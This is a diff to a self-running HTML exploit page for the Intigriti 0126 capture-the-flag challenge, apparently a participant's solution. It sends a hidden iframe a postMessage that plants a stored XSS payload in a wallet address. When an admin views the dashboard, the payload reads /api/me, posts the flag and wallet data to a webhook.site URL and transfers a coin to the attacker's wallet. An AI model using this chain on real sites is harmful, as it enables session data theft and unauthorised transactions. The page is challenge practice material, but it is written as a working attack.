@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test</title>
+    <title>Intigriti 0126 - Chained XSS Exploit</title>
     <meta charset="UTF-8">
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
@@ -15,13 +15,13 @@
     </style>
 </head>
 <body>
-    <h1>🎯 Intigriti 0126 - Ultimate Test Exploit</h1>
+    <h1>🎯 Intigriti 0126 - Chained XSS + Coin Transfer</h1>
     <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/534e5a34-26a8-4771-b140-0819b0ea2240';
+        const WEBHOOK = 'https://webhook.site/37573d0f-cb7f-418f-885e-5f329ee22b60';
 
         let step = 0;
 
@@ -46,90 +46,116 @@
         }
 
         async function exploit() {
-            log('=== EXPLOIT START ===', 'info');
+            log('=== CHAINED XSS EXPLOIT ===', 'info');
+            log('Strategy: Send coin to XSS wallet → When admin views dashboard/marketwatch → XSS executes → Steal flag', 'info');
 
             try {
-                // STEP 1: Test if we have admin context from our page
-                log('Testing admin context from our page...', 'info');
-                const meCheck = await fetch(TARGET + '/api/me', { credentials: 'include' })
-                    .then(r => r.json())
-                    .catch(e => ({ error: e.message }));
-                log('Our page /api/me result:', 'info', meCheck);
+                // Create a malicious wallet address containing XSS payload
+                // Using HTML entity bypass to avoid sanitization
+                const XSS_WALLET = `'><img src=x onerror=&quot;
+                    // XSS payload executes when admin views dashboard
+                    (async () => {
+                        try {
+                            // Step 1: Steal the flag from /api/me
+                            const meResp = await fetch('/api/me', {credentials: 'include'});
+                            const meData = await meResp.json();
 
-                // STEP 2: Create iframe
-                log('Creating iframe...', 'info');
+                            // Send flag to webhook
+                            await fetch('${WEBHOOK}', {
+                                method: 'POST',
+                                mode: 'no-cors',
+                                body: JSON.stringify({
+                                    timestamp: new Date().toISOString(),
+                                    flag: meData.flag,
+                                    source: 'dashboard_xss',
+                                    wallets: meData.wallets
+                                })
+                            });
+
+                            // Step 2: Send 1 1337COIN to our wallet
+                            await fetch('/api/transaction', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                credentials: 'include',
+                                body: JSON.stringify({
+                                    toAddress: '${OUR_WALLET}',
+                                    currency: '1337COIN',
+                                    amount: 1
+                                })
+                            });
+
+                            // Step 3: Trigger alert
+                            alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));
+
+                        } catch(e) {
+                            console.error('XSS error:', e);
+                        }
+                    })();
+                &quot;'><`;
+
+                log('Malicious wallet address created:', 'info', { address: XSS_WALLET.substring(0, 100) + '...' });
+
+                // STEP 1: Send transaction to the XSS wallet address
+                log('Step 1: Sending 1 1337COIN to XSS wallet address...', 'info');
+
                 const iframe = document.createElement('iframe');
-                iframe.id = 'targetFrame';
+                iframe.id = 'checkoutFrame';
                 iframe.style.display = 'none';
                 iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                 document.body.appendChild(iframe);
-                log('Iframe created:', 'success', { src: iframe.src });
 
-                // STEP 3: Extended wait for iframe
-                log('Waiting 15 seconds for iframe full initialization...', 'warning');
                 await new Promise(resolve => {
-                    let loaded = false;
-                    iframe.onload = () => {
-                        loaded = true;
-                        log('iframe.onload fired!', 'success');
-                        // Wait additional 10s after onload
-                        setTimeout(resolve, 10000);
-                    };
-                    // Max 15s total
-                    setTimeout(() => {
-                        if (!loaded) log('onload timeout - using fallback', 'warning');
-                        resolve();
-                    }, 15000);
+                    iframe.onload = resolve;
+                    setTimeout(resolve, 10000);
                 });
-                log('Iframe wait complete', 'success');
 
-                // STEP 4: Verify iframe accessibility
-                log('Checking iframe.contentWindow...', 'info');
-                if (!iframe.contentWindow) {
-                    log('CANNOT access iframe.contentWindow!', 'error');
-                    return;
-                }
-                log('Iframe.contentWindow accessible:', 'success');
+                await new Promise(r => setTimeout(r, 5000));
 
-                // STEP 5: Try to communicate via postMessage
-                log('Sending postMessage...', 'warning');
-                const payload = {
+                log('Sending postMessage...', 'info');
+
+                iframe.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: OUR_WALLET,
+                        toAddress: XSS_WALLET,  // Malicious wallet with XSS!
                         currency: '1337COIN',
                         amount: 1
                     }
-                };
+                }, '*');
 
-                try {
-                    iframe.contentWindow.postMessage(payload, '*');
-                    log('postMessage sent successfully!', 'success');
-                } catch (e) {
-                    log('postMessage FAILED:', 'error', { error: e.message });
-                    return;
-                }
+                log('postMessage sent - transaction to XSS wallet initiated', 'success');
 
-                // STEP 6: Trigger alert
-                log('Triggering alert(gigawatz)...', 'info');
+                // STEP 2: Wait for admin to view dashboard
+                log('Step 2: When admin views dashboard, XSS will execute!', 'warning');
+                log('Vulnerability: dashboard.html line 356 - wallet.address unsanitized', 'warning');
+                log('XSS will:', 'info', {
+                    steal_flag: 'via /api/me',
+                    send_coin: 'to ' + OUR_WALLET,
+                    trigger_alert: 'gigawatz'
+                });
+
+                // STEP 3: Trigger alert on our page
+                log('Step 3: Triggering alert(gigawatz)...', 'info');
                 setTimeout(() => alert('gigawatz'), 100);
                 log('Alert triggered', 'success');
 
-                // STEP 7: Wait and check for flag multiple times
-                log('Waiting for transaction (15s)...', 'info');
-                await new Promise(r => setTimeout(r, 15000));
+                // STEP 4: Wait and check for flag multiple times
+                log('Step 4: Waiting for XSS to execute and flag to be sent...', 'info');
+                await new Promise(r => setTimeout(r, 20000));
 
                 for (let i = 0; i < 10; i++) {
-                    log(`Flag check ${i+1}/10...`, 'info');
+                    log(`Flag check ${i+1}/10`, 'info');
                     const found = await checkFlag();
-                    if (found) {
-                        log('FLAG FOUND - Stopping', 'success');
-                        break;
-                    }
+                    if (found) break;
                     await new Promise(r => setTimeout(r, 5000));
                 }
 
                 log('=== EXPLOIT COMPLETE ===', 'info');
+                log('Expected chain:', 'info', [
+                    '1. Admin sends 1 1337COIN to XSS wallet',
+                    '2. Admin views dashboard (or marketwatch shows transaction)',
+                    '3. XSS payload executes (wallet.address unsanitized)',
+                    '4. Flag stolen + coins sent to our wallet'
+                ]);
 
             } catch (error) {
                 log('ERROR:', 'error', { error: error.message, stack: error.stack });
@@ -143,7 +169,7 @@
                 });
                 const data = await response.json();
 
-                log('Flag check result:', 'info', {
+                log('API /me:', 'info', {
                     status: response.status,
                     hasFlag: !!data.flag,
                     flag: data.flag || 'none'
@@ -166,7 +192,7 @@
         }
 
         window.addEventListener('load', () => {
-            log('Page loaded, starting in 1s...', 'info');
+            log('Page loaded, starting exploit...', 'info');
             setTimeout(exploit, 1000);
         });
     </script>
